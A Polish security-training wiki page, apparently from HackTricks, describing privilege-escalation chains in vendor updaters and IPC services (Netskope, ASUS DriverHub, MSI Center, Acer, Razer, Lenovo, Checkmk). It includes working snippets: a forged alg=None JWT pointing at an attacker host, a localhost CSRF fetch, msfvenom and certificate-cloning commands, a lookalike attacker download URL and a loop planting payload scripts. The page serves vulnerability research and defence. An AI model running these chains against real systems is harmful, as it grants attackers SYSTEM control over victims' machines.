# Nadużywanie firmowych auto-updaterów i uprzywilejowanego IPC (np. Netskope, ASUS i MSI)

{{#include ../../banners/hacktricks-training.md}}

Ta strona uogólnia klasę łańcuchów eskalacji lokalnych uprawnień w Windows, które wykryto w firmowych agentach endpointów i updaterach udostępniających łatwo dostępny interfejs IPC oraz uprzywilejowany proces aktualizacji. Reprezentatywnym przykładem jest Netskope Client for Windows < R129 (CVE-2025-0309), w którym użytkownik o niskich uprawnieniach może wymusić rejestrację na serwerze kontrolowanym przez atakującego, a następnie dostarczyć złośliwy MSI, który usługa SYSTEM zainstaluje.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Kluczowe pomysły, które można wykorzystać przeciwko podobnym produktom:
- Nadużyj localhost IPC uprzywilejowanej usługi, aby wymusić ponowną rejestrację lub rekonfigurację na serwer atakującego.
- Zaimplementuj endpointy aktualizacji dostawcy, dostarcz nieuczciwy Trusted Root CA i wskaż updaterowi złośliwy „podpisany” pakiet.
- Omiń słabe kontrole podpisującego (listy dozwolonych CN), opcjonalne flagi digest i liberalne właściwości MSI.
- Jeśli IPC jest „szyfrowane”, wyprowadź klucz/IV z publicznie dostępnych identyfikatorów komputera zapisanych w rejestrze.
- Jeśli usługa ogranicza wywołujących na podstawie ścieżki obrazu/nazwy procesu, wstrzyknij kod do procesu z listy dozwolonych albo uruchom go w stanie wstrzymania i załaduj swoją DLL za pomocą minimalnej modyfikacji kontekstu wątku.

Niestandardowe lokalne usługi TCP wymagają takiej samej analizy tożsamości i granic danych wejściowych, nawet jeśli wymagają PIN-u lub innych danych uwierzytelniających aplikacji. Ustal, z jakim procesem i efektywnym kontem usługi powiązany jest listener, a następnie sprawdź dokładny wdrożony plik binarny i jego wersję oraz to, czy pola kontrolowane przez wywołującego są sprawdzane pod kątem długości przed skopiowaniem do buforów o stałym rozmiarze lub użyciem do utworzenia polecenia procesu potomnego. [Wskazówki Microsoftu dotyczące przepełnienia bufora](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) wyjaśniają, dlaczego niesprawdzone dane zewnętrzne są niebezpieczne w uprzywilejowanym kodzie natywnym. Listener loopback, hardcoded credential ani sama nazwa procesu nie dowodzą wystąpienia uszkodzenia pamięci ani wykonania kodu jako SYSTEM; osiągalność, autoryzacja, ścieżka kodu i mechanizmy ochronne to odrębne warunki. Rutynowe rozpoznanie powinno być pasywne — nie wysyłaj do działającej usługi danych wejściowych o długości powodującej awarię.

---
## 1) Wymuszanie rejestracji na serwerze atakującego przez localhost IPC

Wiele agentów zawiera proces interfejsu użytkownika działający w trybie użytkownika, który komunikuje się z usługą SYSTEM przez localhost TCP, używając JSON.

Zaobserwowano w Netskope:
- UI: stAgentUI (niska integralność) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Przebieg exploita:
1) Przygotuj token rejestracyjny JWT, którego claims pozwalają kontrolować host backendu (np. AddonUrl). Użyj alg=None, aby podpis nie był wymagany.
2) Wyślij komunikat IPC wywołujący polecenie provisioning z Twoim JWT i nazwą tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Usługa zaczyna wysyłać żądania do Twojego rogue servera w celu pobrania informacji o enrollment/config, np.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Uwagi:
- Jeśli weryfikacja wywołującego opiera się na ścieżce/nazwie, wyślij żądanie z dozwolonego pliku binarnego dostawcy (zob. §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Zarządzające IPC dostępne przez sieć

Ta granica zaufania nie zawsze ogranicza się do localhost. W opisanym przypadku MyReport Updater 2.1.1 usługa `LocalSystem` nasłuchiwała na wszystkich interfejsach i akceptowała nieuwierzytelnioną zmianę konfiguracji gRPC dotyczącą hosta referencyjnego, portu i trybu działania. W wariancie zdalnym wymagany był zarówno dostęp sieciowy do nasłuchującego endpointu, jak i wychodzący dostęp usługi do wybranego hosta referencyjnego. Oceń te kwestie niezależnie od tego, czy późniejszy przepływ pakietu może przekroczyć granicę zapisu plików.<sup>[[16]](#references)</sup>

---
## 2) Przejęcie kanału aktualizacji w celu uruchomienia kodu jako SYSTEM

Gdy klient połączy się z Twoim serwerem, zaimplementuj oczekiwane endpointy i pokieruj go do złośliwego MSI. Typowa sekwencja:

1) /v2/config/org/clientconfig → Zwróć konfigurację JSON z bardzo krótkim interwałem aktualizacji, np.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Zwraca certyfikat CA w formacie PEM. Usługa instaluje go w magazynie Trusted Root komputera lokalnego.
3) /v2/checkupdate → Dostarcza metadane wskazujące na złośliwy plik MSI i fałszywą wersję.

Omijanie typowych kontroli spotykanych w praktyce:
- Lista dozwolonych CN wystawcy: usługa może sprawdzać tylko, czy Subject CN ma wartość „netSkope Inc” lub „Netskope, Inc.”. Twoje rogue CA może wystawić certyfikat leaf z takim CN i podpisać plik MSI.
- Właściwość CERT_DIGEST: dodaj do pliku MSI nieszkodliwą właściwość o nazwie CERT_DIGEST. Podczas instalacji nie jest ona weryfikowana.
- Opcjonalne wymuszanie weryfikacji digestu: flaga konfiguracji (np. check_msi_digest=false) wyłącza dodatkową weryfikację kryptograficzną.

Wynik: usługa SYSTEM instaluje twój plik MSI z lokalizacji
C:\ProgramData\Netskope\stAgent\data\*.msi
i wykonuje dowolny kod jako NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Wniosek dotyczący omijania poprawek: jeśli dostawca zareaguje, dodając do listy dozwolonych niewielką liczbę „zaufanych” domen zamiast kryptograficznie uwierzytelniać źródło aktualizacji, poszukaj należących do dostawcy przekierowań lub reverse proxy, które nadal umożliwiają przekierowanie ruchu. W przypadku Netskope późniejsze publiczne badania wykazały, że lista dozwolonych z epoki R129 nadal mogła zostać wykorzystana za pośrednictwem `rproxy.goskope.com`, który pośredniczył w dostarczaniu treści Azure App Service kontrolowanych przez atakującego. Traktuj listy dozwolonych nazw hostów jako utrudnienie, a nie granicę zaufania.<sup>[[14]](#references)</sup>

Innym rodzajem błędu są **wewnętrznie spójne, ale nieuwierzytelnione metadane pakietu**. W przypadku MyReport odwołanie kontrolowane przez atakującego udostępniało zmodyfikowane archiwum, a pośrednik zmieniał wartości digestu MD5 i rozmiaru podawane przez dostawcę, zanim dotarły one do programu aktualizującego. Zgodność tych wartości potwierdzała spójność odpowiedzi, a nie jej pochodzenie od dostawcy; nie było potrzeby uzyskania kolizji MD5. Możliwość wskazania przez wywołującego katalogu instalacyjnego sprawiała następnie, że uprzywilejowana ekstrakcja stawała się granicą zapisu plików. Uzyskany w ten sposób prymityw umożliwiający ładowanie DLL opisano w sekcji [łączenie dowolnego zapisu plików z DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Fałszowanie zaszyfrowanych żądań IPC (jeśli występują)

Od wersji R127 Netskope opakowuje JSON IPC w polu encryptData, które wygląda na zakodowane w Base64. Analiza wsteczna wykazała użycie AES z kluczem i IV wyprowadzanymi z wartości rejestru dostępnych do odczytu dla każdego użytkownika:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atakujący mogą odtworzyć szyfrowanie i wysyłać prawidłowe zaszyfrowane polecenia ze standardowego konta użytkownika.<sup>[[1]](#references)[[2]](#references)</sup> Ogólna wskazówka: jeśli agent nagle zaczyna „szyfrować” IPC, sprawdź, czy jako materiału nie używa identyfikatorów urządzeń, GUID-ów produktów lub identyfikatorów instalacji z HKLM.

---
## 4) Omijanie list dozwolonych wywołujących IPC (kontrole ścieżki/nazwy)

Niektóre usługi próbują uwierzytelnić drugą stronę, ustalając PID procesu obsługującego połączenie TCP i porównując ścieżkę/nazwę jego obrazu z listą dozwolonych plików binarnych dostawcy znajdujących się w Program Files (np. stagentui.exe, bwansvc.exe, epdlp.exe).

Dwa praktyczne sposoby obejścia:
- Wstrzyknięcie DLL do procesu z listy dozwolonych (np. nsdiag.exe) i przekazywanie żądań IPC z jego wnętrza.
- Uruchomienie pliku binarnego z listy dozwolonych w stanie wstrzymania i zainicjowanie proxy DLL bez użycia CreateRemoteThread (zob. §5), aby spełnić reguły ochrony wymuszane przez sterownik.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Wstrzykiwanie zgodne z ochroną przed manipulacją: wstrzymany proces + modyfikacja NtContinue

Produkty często zawierają sterownik minifilter/OB callbacks (np. Stadrv), który odbiera niebezpieczne uprawnienia uchwytom do chronionych procesów:
- Proces: usuwa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Wątek: ogranicza uprawnienia do THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Niezawodny loader działający w trybie użytkownika, który respektuje te ograniczenia:
1) Utwórz proces z pliku binarnego dostawcy za pomocą CREATE_SUSPENDED.
2) Uzyskaj uchwyty, które nadal możesz otworzyć: PROCESS_VM_WRITE | PROCESS_VM_OPERATION dla procesu oraz uchwyt wątku z THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (lub tylko THREAD_RESUME, jeśli modyfikujesz kod pod znanym RIP).
3) Nadpisz ntdll!NtContinue (lub inny wczesny, zawsze mapowany thunk) krótkim stubem, który wywołuje LoadLibraryW ze ścieżką do twojej DLL, a następnie wraca.
4) Wywołaj ResumeThread, aby uruchomić stub w procesie i załadować DLL.

Ponieważ nie używasz PROCESS_CREATE_THREAD ani PROCESS_SUSPEND_RESUME na procesie, który już jest chroniony (to ty go utworzyłeś), działanie jest zgodne z polityką sterownika.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktyczne narzędzia
- NachoVPN (plugin Netskope) automatyzuje utworzenie rogue CA, podpisanie złośliwego pliku MSI i udostępnienie wymaganych endpointów: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope to niestandardowy klient IPC, który tworzy dowolne komunikaty IPC (opcjonalnie zaszyfrowane AES) i zawiera mechanizm wstrzykiwania do wstrzymanego procesu, aby wysyłać żądania z pliku binarnego znajdującego się na liście dozwolonych.<sup>[[4]](#references)</sup>

## 7) Szybki proces wstępnej oceny nieznanych powierzchni updatera/IPC

W przypadku nowego agenta endpointowego lub pakietu „pomocniczego” do płyty głównej szybki proces zwykle wystarcza, by ocenić, czy masz do czynienia z obiecującym celem do eskalacji uprawnień:<sup>[[6]](#references)</sup>

1) Wylicz nasłuchujące usługi loopback i powiąż je z procesami dostawcy:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Wylicz potencjalne nazwane potoki:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Pozyskaj dane routingu przechowywane w rejestrze, używane przez serwery IPC oparte na pluginach:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Najpierw wyodrębnij nazwy endpointów, klucze JSON i identyfikatory poleceń z klienta działającego w trybie użytkownika. Spakowane frontendowe aplikacje Electron/.NET często ujawniają pełny schemat:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Szukaj rzeczywistego predykatu zaufania, a nie tylko ścieżki kodu, która ostatecznie uruchamia proces:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Wzorce warte priorytetowego sprawdzenia:
- `CryptQueryObject`/parsowanie certyfikatu bez `WinVerifyTrust` zwykle oznacza, że „certyfikat istnieje” uznano za równoznaczne z „certyfikat jest zaufany”, co umożliwia klonowanie certyfikatów lub inne sztuczki z fałszywym signerem.
- Sprawdzanie podciągów/sufiksów w `Origin`, `Referer`, URL-ach pobierania, nazwach procesów lub CN-ach signerów nie stanowi uwierzytelniania. `contains(".vendor.com")` można zwykle wykorzystać za pomocą kontrolowanych przez atakującego domen podszywających się pod właściwą.
- Jeśli GUI z niskimi uprawnieniami decyduje, że „plik jest zaufany”, a broker SYSTEM jedynie przyjmuje ten wynik, załatanie lub ponowna implementacja DLL/JS po stronie klienta często całkowicie omija tę granicę (podział walidacji w stylu Razer).
- Jeśli broker kopiuje payload do `%TEMP%`/`C:\Windows\Temp`, a następnie waliduje go lub planuje jego uruchomienie z tej ścieżki, od razu sprawdź okna TOCTOU umożliwiające podmianę oraz sąsiednie moduły pluginów udostępniające alternatywne wrappery `ExecuteTask()` ze słabszymi kontrolami.<sup>[[6]](#references)</sup>

W przypadku celów intensywnie korzystających z named pipes PipeViewer to szybki sposób na wykrycie słabych DACL-i i zdalnie dostępnych pipe'ów, zanim zaczniesz szczegółowo analizować protokół.<sup>[[11]](#references)</sup>

Jeśli cel uwierzytelnia wywołujących wyłącznie na podstawie PID, ścieżki obrazu lub nazwy procesu, potraktuj to jako przeszkodę, a nie granicę bezpieczeństwa: wstrzyknięcie kodu do legalnego klienta albo nawiązanie połączenia z procesu znajdującego się na allowliście często wystarczy, by spełnić kontrole serwera. W przypadku named pipes więcej informacji o tej technice zawiera [ta strona o podszywaniu się pod klienta i nadużywaniu pipe'ów](named-pipe-client-impersonation.md).

W przypadku uprzywilejowanego **brokera czyszczenia lub przywracania** sprawdź granicę zaufania ścieżek, a także ACL pipe'a. Użytkownik z niższymi uprawnieniami może być w stanie wybrać miejsce docelowe przywracania lub zmienić nazwę przygotowanego artefaktu kopii zapasowej w współdzielonym katalogu, nawet jeśli plik wykonywalny usługi i jej katalog instalacyjny są chronione. Osobno potwierdź, że wywołujący może uruchomić polecenie przywracania, zmodyfikować dokładny przygotowany plik wejściowy lub jego nazwę, że broker działa z wyższą tożsamością oraz że operacja przywracania rzeczywiście zapisuje dane w wybranej chronionej ścieżce. Sam katalog stagingowy z prawem zapisu lub pipe z prawem odczytu nie dowodzi możliwości dowolnego zapisu z uprawnieniami; mapowanie miejsca docelowego i działanie usługi wymagają przeglądu kodu lub kontrolowanych testów. Nie uruchamiaj nieznanego polecenia czyszczenia podczas pasywnego rozpoznania, ponieważ może ono usunąć pliki użytkownika.

---
## 8) Modularne brokery add-inów uwierzytelniające wyłącznie na podstawie podpisów dostawcy (wzorzec Lenovo Vantage)

Nowszym wariantem, którego warto szukać, jest **broker RPC z uwierzytelnianiem podpisanego klienta**: proces Lenovo-signed desktop z niskimi uprawnieniami komunikuje się z usługą SYSTEM, a usługa kieruje polecenia JSON do zestawu add-inów opisanych w XML w `%ProgramData%`. Po uzyskaniu wykonania kodu **wewnątrz dowolnego zaakceptowanego podpisanego klienta** każdy kontrakt `runas="system"` staje się częścią powierzchni ataku.<sup>[[15]](#references)</sup>

Wartościowe prymitywy zaobserwowane w badaniach Lenovo Vantage:
- **Zaufanie do wywołującego ze względu na podpis dostawcy**: badacze uzyskali uwierzytelniony kontekst, kopiując podpisany przez Lenovo plik EXE do katalogu z prawem zapisu i spełniając warunki DLL side-load (`profapi.dll`), dzięki czemu dowolny kod uruchomił się wewnątrz klienta, któremu usługa już ufała.
- **Odkrywanie powierzchni ataku na podstawie manifestów**: add-iny są deklarowane w `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; kilka kontraktów działa jako `SYSTEM`, więc enumeracja tych manifestów często pozwala szybciej odkryć rzeczywiste uprzywilejowane operacje niż analiza samego brokera.
- **Błędy poszczególnych poleceń za uwierzytelnionym kanałem**: po wejściu do zaufanego klienta publiczne badania ujawniły traversal ścieżek i race condition w poleceniach aktualizacji/instalacji, nadużycia raw SQL w uprzywilejowanych bazach ustawień oraz kontrole ścieżek rejestru oparte na podciągach, które umożliwiały zapisy poza zamierzonym hive'em.

Przydatne rozpoznanie celu:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktyczny wniosek: gdy pakiet pomocniczych narzędzi udostępnia brokera, który najpierw uwierzytelnia **proces wywołujący**, a dopiero potem przekazuje żądania do dziesiątek poleceń pluginów/dodatków, nie poprzestawaj na ominięciu początkowej kontroli zaufania. Zrzutuj tabelę manifestu/kontraktu i niezależnie fuzzuj każde polecenie o wysokich uprawnieniach; uwierzytelniony kanał zwykle skrywa kilka błędów drugiego etapu.

---
## 1) CSRF z przeglądarki do localhost przeciwko uprzywilejowanym API HTTP (ASUS DriverHub)

DriverHub dostarcza usługę HTTP działającą w trybie użytkownika (ADU.exe) pod adresem 127.0.0.1:53000, która oczekuje wywołań przeglądarki pochodzących z https://driverhub.asus.com. Filtr origin po prostu wykonuje `string_contains(".asus.com")` na nagłówku Origin oraz na adresach URL pobierania udostępnianych przez `/asus/v1.0/*`. Dlatego dowolny host kontrolowany przez atakującego, taki jak `https://driverhub.asus.com.attacker.tld`, przechodzi kontrolę i może wysyłać żądania zmieniające stan za pomocą JavaScript.<sup>[[6]](#references)</sup> Zobacz [podstawy CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md), aby poznać dodatkowe wzorce omijania zabezpieczeń.

Praktyczny przebieg:
1) Zarejestruj domenę zawierającą `.asus.com` i umieść na niej złośliwą stronę.
2) Użyj `fetch` lub XHR, aby wywołać uprzywilejowany endpoint (np. `Reboot`, `UpdateApp`) pod adresem `http://127.0.0.1:53000`.
3) Wyślij treść JSON oczekiwaną przez handler – spakowany frontend JS pokazuje poniższy schemat.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Nawet pokazany poniżej interfejs PowerShell CLI działa poprawnie, gdy nagłówek Origin zostanie spoofowany na zaufaną wartość:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Każda wizyta w witrynie atakującego w przeglądarce staje się zatem lokalnym CSRF wymagającym jednego kliknięcia (lub żadnego, jeśli użyto `onload`), który uruchamia pomocniczy proces z uprawnieniami SYSTEM.

---
## 2) Niebezpieczna weryfikacja podpisu kodu i klonowanie certyfikatu (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` pobiera dowolne pliki wykonywalne określone w treści JSON i zapisuje je w pamięci podręcznej w `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Walidacja URL pobierania wykorzystuje tę samą logikę sprawdzania podciągu, więc akceptowany jest adres `http://updates.asus.com.attacker.tld:8000/payload.exe`. Po pobraniu ADU.exe jedynie sprawdza, czy plik PE zawiera podpis i czy ciąg Subject odpowiada ASUS, a następnie go uruchamia — bez `WinVerifyTrust` i bez walidacji łańcucha certyfikatów.

Aby wykorzystać ten mechanizm:
1) Utwórz payload (np. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Sklonuj do niego certyfikat podpisujący ASUS (np. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Umieść `pwn.exe` w witrynie z domeną podszywającą się pod `.asus.com` i wywołaj UpdateApp za pomocą opisanego wyżej browser CSRF.

Ponieważ zarówno filtry Origin, jak i URL sprawdzają podciągi, a weryfikacja certyfikatu porównuje tylko ciągi znaków, DriverHub pobiera i uruchamia plik binarny atakującego z podwyższonymi uprawnieniami.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU w ścieżkach kopiowania/uruchamiania aktualizatora (MSI Center CMD_AutoUpdateSDK)

Usługa MSI Center działająca z uprawnieniami SYSTEM udostępnia protokół TCP, w którym każda ramka ma postać `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Główny komponent (Component ID `0f 27 00 00`) udostępnia `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Obsługa tego polecenia:
1) Kopiuje podany plik wykonywalny do `C:\Windows\Temp\MSI Center SDK.exe`.
2) Weryfikuje podpis za pomocą `CS_CommonAPI.EX_CA::Verify` (Subject certyfikatu musi być równy „MICRO-STAR INTERNATIONAL CO., LTD.”, a `WinVerifyTrust` musi zwrócić sukces).
3) Tworzy zaplanowane zadanie, które uruchamia plik tymczasowy jako SYSTEM z argumentami kontrolowanymi przez atakującego.

Skopiowany plik nie jest blokowany między weryfikacją a wywołaniem `ExecuteTask()`. Atakujący może:
- Wysłać ramkę A wskazującą na legalny plik binarny podpisany przez MSI (co gwarantuje zaliczenie weryfikacji podpisu i dodanie zadania do harmonogramu).
- Ścigać ją, wielokrotnie wysyłając ramki B wskazujące na złośliwy payload i nadpisując `MSI Center SDK.exe` tuż po zakończeniu weryfikacji.

Gdy harmonogram uruchomi zadanie, wykona nadpisany payload z uprawnieniami SYSTEM, mimo że zweryfikowano oryginalny plik. Niezawodne wykorzystanie luki wymaga dwóch goroutines/wątków, które wielokrotnie wysyłają CMD_AutoUpdateSDK, aż uda się wykorzystać okno TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Wykorzystywanie niestandardowego IPC z uprawnieniami SYSTEM i impersonacji (MSI Center + Acer Control Centre)

### Zestawy poleceń TCP MSI Center
- Każdy plugin/DLL załadowany przez `MSI.CentralServer.exe` otrzymuje Component ID zapisany w `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Pierwsze 4 bajty ramki wskazują ten komponent, co pozwala atakującym kierować polecenia do dowolnych modułów.
- Pluginy mogą definiować własne mechanizmy uruchamiania zadań. `Support\API_Support.dll` udostępnia `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i bezpośrednio wywołuje `API_Support.EX_Task::ExecuteTask()` **bez walidacji podpisu** — każdy użytkownik lokalny może wskazać `C:\Users\<user>\Desktop\payload.exe` i deterministycznie uzyskać wykonanie jako SYSTEM.
- Przechwycenie ruchu loopback za pomocą Wireshark lub instrumentacja plików binarnych .NET w dnSpy szybko ujawnia mapowanie komponentów na polecenia; następnie można odtwarzać ramki za pomocą własnych klientów w Go/Python.<sup>[[6]](#references)</sup>

### Nazwane pipes i poziomy impersonacji Acer Control Centre
- `ACCSvc.exe` (SYSTEM) udostępnia `\\.\pipe\treadstone_service_LightMode`, a jego uznaniowa lista ACL zezwala klientom zdalnym (np. `\\TARGET\pipe\treadstone_service_LightMode`) na dostęp. Wysłanie identyfikatora polecenia `7` ze ścieżką do pliku wywołuje procedurę usługi uruchamiającą proces.
- Biblioteka klienta serializuje bajt kończący o wartości 113 wraz z argumentami. Instrumentacja dynamiczna za pomocą Frida/`TsDotNetLib` (wskazówki dotyczące instrumentacji znajdziesz w [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) pokazuje, że natywny handler mapuje tę wartość na `SECURITY_IMPERSONATION_LEVEL` i SID integralności, zanim wywoła `CreateProcessAsUser`.
- Zamiana 113 (`0x71`) na 114 (`0x72`) powoduje przejście do ogólnej gałęzi, która zachowuje pełny token SYSTEM i ustawia SID o wysokim poziomie integralności (`S-1-16-12288`). W efekcie uruchomiony plik binarny działa jako SYSTEM bez ograniczeń, zarówno lokalnie, jak i na innym komputerze.
- Połącz to z udostępnioną flagą instalatora (`Setup.exe -nocheck`), aby uruchomić ACC nawet na laboratoryjnych maszynach wirtualnych i przetestować pipe bez sprzętu producenta.<sup>[[6]](#references)</sup>

Te błędy IPC pokazują, dlaczego usługi localhost muszą wymagać wzajemnego uwierzytelniania (SID ALPC, filtry `ImpersonationLevel=Impersonation`, filtrowanie tokenów) oraz dlaczego mechanizm „uruchom dowolny plik binarny” każdego modułu musi stosować te same metody weryfikacji certyfikatu podpisującego.

---
## 3) Pomocnicze procesy COM/IPC typu „elevator” oparte na słabej walidacji w przestrzeni użytkownika (Razer Synapse 4)

Razer Synapse 4 wprowadził kolejny przydatny schemat z tej rodziny: użytkownik z niskimi uprawnieniami może poprosić pomocniczy obiekt COM o uruchomienie procesu za pośrednictwem `RzUtility.Elevator`, podczas gdy decyzja o zaufaniu jest delegowana do biblioteki DLL działającej w przestrzeni użytkownika (`simple_service.dll`), zamiast być solidnie egzekwowana w granicy uprzywilejowanego procesu.

Zaobserwowana ścieżka wykorzystania:
- Utwórz instancję obiektu COM `RzUtility.Elevator`.
- Wywołaj `LaunchProcessNoWait(<path>, "", 1)`, aby zażądać uruchomienia z podwyższonymi uprawnieniami.
- W publicznym PoC bramka weryfikująca podpis PE w `simple_service.dll` jest modyfikowana tak, aby ją wyłączyć, zanim zostanie wysłane żądanie. Pozwala to uruchomić dowolny plik wykonywalny wybrany przez atakującego.<sup>[[6]](#references)[[10]](#references)</sup>

Minimalne wywołanie PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Ogólny wniosek: podczas analizowania wstecznego pakietów „helper” nie poprzestawaj na localhost TCP ani named pipes. Sprawdzaj klasy COM o nazwach takich jak `Elevator`, `Launcher`, `Updater` lub `Utility`, a następnie zweryfikuj, czy uprzywilejowana usługa faktycznie sama sprawdza plik binarny celu, czy jedynie ufa wynikowi obliczonemu przez podatną na modyfikacje bibliotekę DLL klienta działającą w trybie użytkownika. Ten wzorzec występuje nie tylko w produktach Razer: każdy podzielony projekt, w którym broker o wysokich uprawnieniach przyjmuje decyzję zezwalającą lub odmawiającą od strony o niskich uprawnieniach, może stanowić powierzchnię privesc.


---
## Predictable temp script execution during MSI repair (Checkmk Agent / CVE-2024-0670)

Niektóre agenty Windows nadal wykonują uprzywilejowane działania, zapisując tymczasowy plik `.cmd` w `C:\Windows\Temp` i uruchamiając go jako `SYSTEM`. Jeśli nazwa pliku jest przewidywalna, a usługa nie odtwarza bezpiecznie już istniejących plików, użytkownik o niskich uprawnieniach może wcześniej utworzyć przyszły plik tymczasowy jako **tylko do odczytu** i sprawić, że uprzywilejowany proces wykona kontrolowaną przez atakującego zawartość zamiast własnego skryptu.

Zaobserwowano w podatnych kompilacjach Checkmk Agent:
- wzorzec nazwy pliku tymczasowego: `cmk_all_<PID>_1.cmd`
- podatne gałęzie: `2.0.0`, `2.1.0`, `2.2.0`
- wyzwalacz: **naprawa** MSI pakietu agenta z pamięci podręcznej<sup>[[8]](#references)[[9]](#references)</sup>

Praktyczny przebieg:
1. Oszacuj realistyczny zakres PID na podstawie aktualnych identyfikatorów procesów lub PID uruchomionego agenta.
2. Zapisz krótki ładunek `.cmd` w kodowaniu **ASCII** (`Set-Content -Encoding Ascii` lub przekierowanie `cmd.exe`; unikaj zapisu PowerShell w formacie UTF-16 dla plików wsadowych).
3. Utwórz wiele plików `C:\Windows\Temp\cmk_all_<PID>_1.cmd` w wybranym zakresie i oznacz każdy jako tylko do odczytu.
4. Wyzwól naprawę MSI z pamięci podręcznej, aby uprzywilejowana usługa podjęła próbę ponownego utworzenia, a następnie wykonała tymczasowy skrypt.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Jeśli podatny produkt został zainstalowany za pomocą Windows Installer, przed wywołaniem naprawy ustal nazwę produktu odpowiadającą losowo wyglądającemu, buforowanemu plikowi MSI w `C:\Windows\Installer`:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Uwagi operacyjne:
- `qwinsta` jest przydatne, gdy `msiexec /fa` kończy się niepowodzeniem w nieinteraktywnej powłoce WinRM i trzeba ustalić, czy istniejąca sesja pulpitu lub sesja rozłączona może prawidłowo uruchomić naprawę.<sup>[[7]](#references)</sup>
- Ten wzorzec dotyczy też innych agentów endpointowych i aktualizatorów, które **umieszczają tymczasowe skrypty w lokalizacjach z prawem zapisu dla wszystkich, a następnie uruchamiają je jako SYSTEM**. Sprawdź, czy nazwy są przewidywalne, czy brakuje semantyki tworzenia wyłącznie nowych plików oraz czy można na żądanie wywołać proces naprawy lub aktualizacji.

### Interaktywna naprawa instalatora i konsola z uprawnieniami

